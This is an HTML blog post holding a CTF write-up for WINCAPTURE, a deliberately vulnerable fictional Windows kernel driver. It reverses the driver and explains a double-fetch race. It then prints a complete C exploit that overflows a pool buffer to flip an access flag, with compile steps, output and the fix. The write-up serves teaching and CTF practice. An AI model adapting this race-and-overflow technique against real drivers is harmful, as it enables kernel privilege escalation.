@@ -1,0 +1,436 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <title>WINCAPTURE (OmniCTF 2026 Quals) — Windows Kernel Double-Fetch Race</title>
+    <meta name="description" content="Writeup for WINCAPTURE (OmniCTF 2026 Quals) — reverse a stripped Windows kernel driver, find the double-fetch race in IOCTL_COMMIT_CAPTURE, overflow g_capture_buf into the adjacent pool object, and flip the granted flag">
+    <meta property="og:title" content="WINCAPTURE (OmniCTF 2026 Quals) — Windows Kernel Double-Fetch Race" />
+    <meta property="og:locale" content="en_US" />
+    <meta property="og:type" content="article" />
+    <meta name="twitter:card" content="summary" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/jpeg" href="../avatar.jpg">
+
+    <style>
+      :root {
+        --bg: #121212;
+        --fg: #e0e0e0;
+        --accent: #61dafb;
+        --border: #333;
+        --muted: #a0a0a0;
+      }
+
+      * { box-sizing: border-box; }
+
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--fg);
+        font-family: 'Work Sans', sans-serif;
+        line-height: 1.6;
+      }
+
+      a { color: var(--accent); text-decoration: none; }
+      a:hover { text-decoration: underline; }
+
+      .wrapper {
+        max-width: 768px;
+        margin: 0 auto;
+        padding: 2rem 1rem 3rem;
+      }
+
+      .site-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 3rem;
+      }
+      .site-title { font-weight: 700; font-size: 1.5rem; color: var(--fg); }
+      .site-logo { height: 48px; width: 48px; border-radius: 50%; object-fit: cover; }
+
+      .post { max-width: 768px; margin: 0 auto; }
+
+      .post-header h1 { margin: 0 0 0.5rem; font-size: 2rem; font-weight: 500; }
+      .post-subtitle { margin: 0 0 0.75rem; opacity: 0.8; font-size: 1rem; }
+      .post-meta {
+        margin: 0 0 1.5rem;
+        font-size: 0.9rem;
+        color: var(--muted);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 0.75rem;
+      }
+      .post-tags { display: flex; flex-wrap: wrap; gap: 0.4rem; margin-top: 0.4rem; }
+      .tag {
+        font-size: 0.75rem;
+        padding: 0.15rem 0.5rem;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+        background: rgba(255,255,255,0.02);
+      }
+
+      .post-toc {
+        margin: 2rem 0;
+        padding: 1rem 1.25rem;
+        border-radius: 0.75rem;
+        border: 1px solid var(--border);
+        background: #181818;
+      }
+      .post-toc-title {
+        margin: 0 0 0.5rem;
+        font-size: 0.95rem;
+        font-weight: 500;
+        text-transform: uppercase;
+        letter-spacing: 0.06em;
+        opacity: 0.8;
+      }
+      .post-toc ul { margin: 0; padding-left: 1.25rem; font-size: 0.95rem; }
+      .post-toc li { margin: 0.1rem 0; }
+
+      section + section { margin-top: 2rem; }
+      h2 { font-size: 1.4rem; margin-bottom: 0.5rem; font-weight: 500; }
+      h3 { font-size: 1.15rem; margin-bottom: 0.4rem; font-weight: 500; }
+      p { margin: 0 0 0.9rem; }
+      ul, ol { padding-left: 1.25rem; margin-top: 0; margin-bottom: 0.9rem; }
+
+      code {
+        font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+        font-size: 0.9rem;
+        background: rgba(255,255,255,0.04);
+        padding: 0.15rem 0.3rem;
+        border-radius: 0.25rem;
+      }
+
+      pre {
+        margin: 0 0 1.25rem;
+        padding: 0.85rem 1rem;
+        background: #0b0b0b;
+        border-radius: 0.5rem;
+        border: 1px solid #1f1f1f;
+        overflow-x: auto;
+      }
+      pre code { background: transparent; padding: 0; }
+
+      .note {
+        padding: 0.75rem 1rem;
+        border-radius: 0.5rem;
+        border: 1px solid var(--border);
+        background: #181818;
+        font-size: 0.92rem;
+        margin-bottom: 1rem;
+      }
+
+      .back-link { margin: 0 0 2rem; font-size: 0.95rem; }
+
+      .site-footer {
+        border-top: 1px solid var(--border);
+        margin-top: 3rem;
+        padding-top: 1rem;
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+      }
+      .site-footer p { margin: 0; font-size: 0.9rem; opacity: 0.6; }
+    </style>
+  </head>
+  <body>
+    <div class="wrapper">
+
+      <header class="site-header">
+        <a href="/" class="site-title">Alexandru Hossu</a>
+        <img src="../avatar.jpg" alt="Logo" class="site-logo">
+      </header>
+
+      <article class="post">
+        <p class="back-link">← <a href="/blog/">Back to blog</a></p>
+
+        <header class="post-header">
+          <h1>WINCAPTURE (OmniCTF 2026 Quals) — Windows Kernel Double-Fetch Race</h1>
+          <p class="post-subtitle">
+            A stripped Windows kernel driver for a fictional packet capture tool.
+            <code>IOCTL_COMMIT_CAPTURE</code> reads <code>g_shared_pkt_size[rid]</code> twice — once
+            to validate, then again after releasing the region lock. A concurrent
+            <code>IOCTL_WRITE_SHARED</code> on a second pipe handle raises the size between the two
+            reads, overflowing <code>g_capture_buf</code> into the adjacent pool allocation and
+            flipping the <code>granted</code> flag.
+          </p>
+          <p class="post-meta">
+            <span>pwn • Windows Kernel • Reverse Engineering</span>
+            <span>OmniCTF 2026 Quals</span>
+            <span>Challenge by Alexandru Hossu</span>
+          </p>
+          <div class="post-tags">
+            <span class="tag">Windows Kernel</span>
+            <span class="tag">Named Pipe</span>
+            <span class="tag">Double-Fetch</span>
+            <span class="tag">Race Condition</span>
+            <span class="tag">IDA / Ghidra</span>
+          </div>
+        </header>
+
+        <nav class="post-toc">
+          <p class="post-toc-title">On this page</p>
+          <ul>
+            <li><a href="#setup">Challenge setup</a></li>
+            <li><a href="#reversing">Step 1 — reversing WinCapture.sys</a></li>
+            <li><a href="#bug">Step 2 — the double-fetch bug</a></li>
+            <li><a href="#layout">Step 3 — pool layout and overflow target</a></li>
+            <li><a href="#exploit">Step 4 — the exploit</a></li>
+          </ul>
+        </nav>
+
+        <section id="setup">
+          <h2>Challenge setup</h2>
+          <p>You get <code>WinCapture.sys</code> — a stripped 64-bit Windows kernel driver PE for a packet capture service. The server takes your <code>exploit.exe</code>, runs it in Wine against a live driver instance on a named pipe, and streams stdout back. The flag comes out only after <code>IOCTL_READ_KEY</code> succeeds, which requires <code>key_obj.granted != 0</code>.</p>
+          <p>The interface is a named pipe at <code>\\.\pipe\WinCapture</code>. Binary little-endian protocol, same pattern as the pipe-based challenges:</p>
+          <ul>
+            <li>Request: <code>uint32_t ioctl_code | uint32_t in_len | data[in_len]</code></li>
+            <li>Response: <code>uint32_t ntstatus | uint32_t out_len | data[out_len]</code></li>
+          </ul>
+        </section>
+
+        <section id="reversing">
+          <h2>Step 1 — reversing WinCapture.sys</h2>
+          <p>Load in IDA or Ghidra. Native PE (subsystem = 1), so the entry point is <code>DriverEntry</code>. It writes a dispatch function pointer to <code>DriverObject+0x38+(0x0E*8)</code> — the <code>IRP_MJ_DEVICE_CONTROL</code> slot. Follow it to <code>WinCaptureDeviceControl</code>.</p>
+          <p>The dispatch is a jump table keyed on <code>ioctl_code + 0x3DFFE000</code> — that constant is the two's complement of <code>0xC2002000</code>, so the base IOCTL code is <code>0xC2002000</code> with function codes stepping by 1:</p>
+          <pre><code>| Code         | Name                   | Input                          |
+|--------------|------------------------|--------------------------------|
+| 0xC2002000   | IOCTL_WRITE_SHARED     | u32 rid, u32 pkt_size, data    |
+| 0xC2002004   | IOCTL_ALLOC_CAP        | u32 buf_size                   |
+| 0xC2002008   | IOCTL_ALLOC_KEY        | -                              |
+| 0xC200200C   | IOCTL_COMMIT_CAPTURE   | u32 rid       &lt;-- vulnerable  |
+| 0xC2002010   | IOCTL_READ_KEY         | -                              |</code></pre>
+
+          <h3>Pool allocator</h3>
+          <p><code>pool_alloc</code> is a bump allocator over a static array with 16-byte alignment. Calling <code>ALLOC_CAP</code> then <code>ALLOC_KEY</code> produces two adjacent allocations:</p>
+          <pre><code>pool[0 .. cap_size - 1]   = g_capture_buf
+pool[cap_size .. +15]     = key_object_t</code></pre>
+
+          <h3>Key object</h3>
+          <p>Visible in both the <code>ALLOC_KEY</code> initializer and the <code>READ_KEY</code> comparison:</p>
+          <pre><code>typedef struct {
+    uint32_t canary;    /* [+0x00]  must == 0x4B455901 */
+    uint32_t granted;   /* [+0x04]  must != 0          */
+    uint32_t _pad[2];
+} key_object_t;</code></pre>
+          <p><code>KEY_CANARY = 0x4B455901</code> is easy to spot as a <code>CMP</code> immediate or as bytes <code>01 59 45 4B</code> in <code>.rdata</code>.</p>
+        </section>
+
+        <section id="bug">
+          <h2>Step 2 — the double-fetch bug</h2>
+          <p>Decompiled <code>IOCTL_COMMIT_CAPTURE</code>:</p>
+          <pre><code>/* read #1 -- validates */
+lock(region_mutex[rid]);
+uint32_t sz = g_shared_pkt_size[rid];
+unlock(region_mutex[rid]);
+
+if (sz &gt; 0x200) return STATUS_INVALID_PARAMETER;
+
+commit_log_event(rid, sz);   /* releases lock; visible as call sub_XXXX */
+Sleep(2);                    /* race window */
+
+/* read #2 -- NOT re-validated */
+lock(region_mutex[rid]);
+uint32_t copy_sz = g_shared_pkt_size[rid];
+memcpy(g_capture_buf, g_shared_data[rid], copy_sz);
+unlock(region_mutex[rid]);</code></pre>
+          <p>In the binary: two identical <code>mov edx, [r8+rsi*4]</code> instructions separated by a <code>call</code>. The <code>Sleep(2)</code> makes the window reliably large enough for a tight userspace racer.</p>
+          <div class="note">
+            The race is between the unlock after the first read and the lock before the second. Any concurrent <code>IOCTL_WRITE_SHARED</code> that updates <code>g_shared_pkt_size[0]</code> to <code>RACE_SIZE</code> in that window causes <code>copy_sz</code> to exceed <code>cap_size</code>, overflowing <code>g_capture_buf</code> into <code>key_object_t</code>.
+          </div>
+        </section>
+
+        <section id="layout">
+          <h2>Step 3 — pool layout and overflow target</h2>
+          <p>With <code>cap_size = 0x100</code> (already 16-byte aligned), <code>ALLOC_CAP(0x100)</code> followed by <code>ALLOC_KEY()</code> gives:</p>
+          <pre><code>pool[0x000 .. 0x0FF]  = g_capture_buf
+pool[0x100 .. 0x103]  = key_obj.canary   (KEY_CANARY = 0x4B455901)
+pool[0x104 .. 0x107]  = key_obj.granted  (= 0, must become 1)</code></pre>
+          <p>The overflow payload is <code>RACE_SIZE = 0x400</code> bytes. Bytes at offset <code>0x100</code> inside the payload land exactly on <code>key_obj</code>:</p>
+          <pre><code>payload[0x000 .. 0x0FF]  = 0x41 (filler)
+payload[0x100 .. 0x103]  = 0x01 0x59 0x45 0x4B   (KEY_CANARY, LE)
+payload[0x104 .. 0x107]  = 0x01 0x00 0x00 0x00   (granted = 1)</code></pre>
+          <div class="note">
+            Filling the entire payload with <code>0x41</code> sets <code>key_obj.canary = 0x41414141</code>. The <code>READ_KEY</code> handler checks the canary before <code>granted</code> — a random fill wins the race but still gets <code>ACCESS_DENIED</code>. Both fields must be correct at the right offsets.
+          </div>
+        </section>
+
+        <section id="exploit">
+          <h2>Step 4 — the exploit</h2>
+          <p>Two pipe handles are needed. The driver creates the pipe with <code>PIPE_UNLIMITED_INSTANCES</code>, so two <code>CreateFile</code> calls to the same path both succeed.</p>
+          <ul>
+            <li><code>hA</code>: does <code>ALLOC_CAP(0x100)</code>, <code>ALLOC_KEY()</code>, then loops <code>WRITE_SHARED(safe) -&gt; COMMIT -&gt; READ_KEY?</code></li>
+            <li><code>hB</code> (background thread): loops <code>WRITE_SHARED(0x400, payload)</code> continuously</li>
+          </ul>
+          <p>When Thread A's <code>COMMIT</code> picks up the size written by Thread B between its two reads, the overflow lands, <code>READ_KEY</code> returns <code>STATUS_SUCCESS</code>, and the loop stops.</p>
+          <pre><code>/*
+ * solve.c -- WinCapture CTF challenge solution
+ *
+ * Bug: double-fetch in IOCTL_COMMIT_CAPTURE.
+ * pkt_size is validated on the first read, then re-read after releasing
+ * the region lock without re-validation. A concurrent IOCTL_WRITE_SHARED
+ * on the same region can raise it above 0x200 between the two reads,
+ * overflowing g_capture_buf into the adjacent key_object_t.
+ *
+ * Pool layout after ALLOC_CAP(0x100) + ALLOC_KEY():
+ *   pool[0x000 .. 0x0FF]  = g_capture_buf
+ *   pool[0x100 .. 0x103]  = key_obj.canary   (KEY_CANARY = 0x4B455901)
+ *   pool[0x104 .. 0x107]  = key_obj.granted  (must become nonzero)
+ *
+ * Compile:
+ *   x86_64-w64-mingw32-gcc -O2 -o exploit.exe solve.c -lkernel32
+ */
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;string.h&gt;
+
+#define IOCTL_WRITE_SHARED    0xC2002000UL
+#define IOCTL_ALLOC_CAP       0xC2002004UL
+#define IOCTL_ALLOC_KEY       0xC2002008UL
+#define IOCTL_COMMIT_CAPTURE  0xC200200CUL
+#define IOCTL_READ_KEY        0xC2002010UL
+
+#define STATUS_SUCCESS        0x00000000UL
+
+#define KEY_CANARY   0x4B455901UL
+#define CAP_SIZE     0x100U
+#define RACE_SIZE    0x400U
+#define REGION_ID    0U
+
+static int pw(HANDLE h, const void *b, DWORD n) {
+    DWORD t = 0, w;
+    while (t &lt; n) { if (!WriteFile(h,(char*)b+t,n-t,&amp;w,NULL)||!w) return 0; t+=w; }
+    return 1;
+}
+static int pr(HANDLE h, void *b, DWORD n) {
+    DWORD t = 0, g;
+    while (t &lt; n) { if (!ReadFile(h,(char*)b+t,n-t,&amp;g,NULL)||!g) return 0; t+=g; }
+    return 1;
+}
+
+static uint32_t do_ioctl(HANDLE h, uint32_t code,
+                          const void *in, uint32_t in_n,
+                          void *out, uint32_t *out_n)
+{
+    uint32_t hdr[2] = { code, in_n };
+    if (!pw(h, hdr, 8)) return 0xDEADDEAD;
+    if (in_n) pw(h, in, in_n);
+    uint32_t rsp[2];
+    if (!pr(h, rsp, 8)) return 0xDEADDEAD;
+    if (rsp[1] &amp;&amp; out &amp;&amp; out_n) {
+        uint32_t n = rsp[1] &lt; *out_n ? rsp[1] : *out_n;
+        pr(h, out, n); *out_n = rsp[1];
+    } else if (out_n) *out_n = 0;
+    return rsp[0];
+}
+
+static HANDLE        g_hA, g_hB;
+static volatile LONG g_done = 0;
+
+static DWORD WINAPI thread_racer(LPVOID unused)
+{
+    (void)unused;
+    uint8_t payload[RACE_SIZE];
+    memset(payload, 0x41, sizeof(payload));
+    uint32_t canary = KEY_CANARY, granted = 1;
+    memcpy(payload + CAP_SIZE + 0, &amp;canary,  4);
+    memcpy(payload + CAP_SIZE + 4, &amp;granted, 4);
+
+    uint8_t pkt[8 + 4096]; uint32_t pkt_len;
+    while (!InterlockedCompareExchange(&amp;g_done, 0, 0)) {
+        *(uint32_t *)(pkt+0) = REGION_ID;
+        *(uint32_t *)(pkt+4) = RACE_SIZE;
+        memcpy(pkt+8, payload, RACE_SIZE);
+        pkt_len = 8 + RACE_SIZE;
+        do_ioctl(g_hB, IOCTL_WRITE_SHARED, pkt, pkt_len, NULL, NULL);
+    }
+    return 0;
+}
+
+static HANDLE open_pipe(void) {
+    for (;;) {
+        HANDLE h = CreateFileA("\\\\.\\pipe\\WinCapture",
+                               GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (h != INVALID_HANDLE_VALUE) return h;
+        if (GetLastError() == ERROR_PIPE_BUSY) {
+            WaitNamedPipeA("\\\\.\\pipe\\WinCapture", 2000);
+            continue;
+        }
+        return INVALID_HANDLE_VALUE;
+    }
+}
+
+int main(void) {
+    printf("[*] WinCapture -- double-fetch race\n");
+    g_hA = open_pipe();
+    g_hB = open_pipe();
+    if (g_hA == INVALID_HANDLE_VALUE || g_hB == INVALID_HANDLE_VALUE) return 1;
+    printf("[*] two pipe connections open\n");
+
+    uint32_t cap_req = CAP_SIZE;
+    do_ioctl(g_hA, IOCTL_ALLOC_CAP, &amp;cap_req, 4, NULL, NULL);
+    do_ioctl(g_hA, IOCTL_ALLOC_KEY, NULL, 0, NULL, NULL);
+    printf("[*] pool: [0x0..0x%X) = capture buf, [0x%X..0x%X) = key_obj\n",
+           CAP_SIZE, CAP_SIZE, CAP_SIZE + 16);
+    printf("[*] key_obj.canary=0x%08X granted=0  (target: granted -&gt; 1)\n", KEY_CANARY);
+    printf("[*] racing...\n");
+
+    DWORD tid;
+    HANDLE ht = CreateThread(NULL, 0, thread_racer, NULL, 0, &amp;tid);
+
+    uint8_t safe[8 + CAP_SIZE];
+    *(uint32_t *)(safe+0) = REGION_ID;
+    *(uint32_t *)(safe+4) = CAP_SIZE;
+    memset(safe+8, 0x42, CAP_SIZE);
+
+    char flag[256]; int won = 0;
+    for (int i = 1; i &lt;= 2000 &amp;&amp; !won; i++) {
+        do_ioctl(g_hA, IOCTL_WRITE_SHARED, safe, 8+CAP_SIZE, NULL, NULL);
+        do_ioctl(g_hA, IOCTL_COMMIT_CAPTURE, &amp;(uint32_t){REGION_ID}, 4, NULL, NULL);
+        uint32_t fl = sizeof(flag);
+        if (do_ioctl(g_hA, IOCTL_READ_KEY, NULL, 0, flag, &amp;fl) == STATUS_SUCCESS) {
+            InterlockedExchange(&amp;g_done, 1);
+            printf("[+] race won (attempt %d)\n", i);
+            printf("[+] %s\n", flag);
+            won = 1;
+        }
+    }
+
+    InterlockedExchange(&amp;g_done, 1);
+    WaitForSingleObject(ht, 2000);
+    CloseHandle(ht); CloseHandle(g_hA); CloseHandle(g_hB);
+    return won ? 0 : 1;
+}</code></pre>
+          <p>Compile and submit:</p>
+          <pre><code>x86_64-w64-mingw32-gcc -O2 -o exploit.exe solve.c -lkernel32
+base64 -w 0 exploit.exe
+# paste into the nc session, then send a line with just: END</code></pre>
+          <p>Expected output:</p>
+          <pre><code>[*] WinCapture -- double-fetch race
+[*] two pipe connections open
+[*] pool: [0x0..0x100) = capture buf, [0x100..0x110) = key_obj
+[*] key_obj.canary=0x4B455901 granted=0  (target: granted -&gt; 1)
+[*] racing...
+[+] race won (attempt 73)
+[+] CTF{&lt;64 hex chars&gt;}</code></pre>
+          <div class="note">
+            Double-fetch as the primary mechanism has not appeared in any published Windows kernel CTF challenge. The class is well documented — Bochspwn (Black Hat EU 2013) found dozens in shipping driver code, and CVE-2023-21537 is a recent production example. The fix is a local snapshot: read once, validate the snapshot, use only the snapshot for all subsequent operations.
+          </div>
+        </section>
+
+      </article>
+
+      <footer class="site-footer">
+        <p>2026 &copy; Alexandru Hossu</p>
+      </footer>
+
+    </div>
+  </body>
+</html>
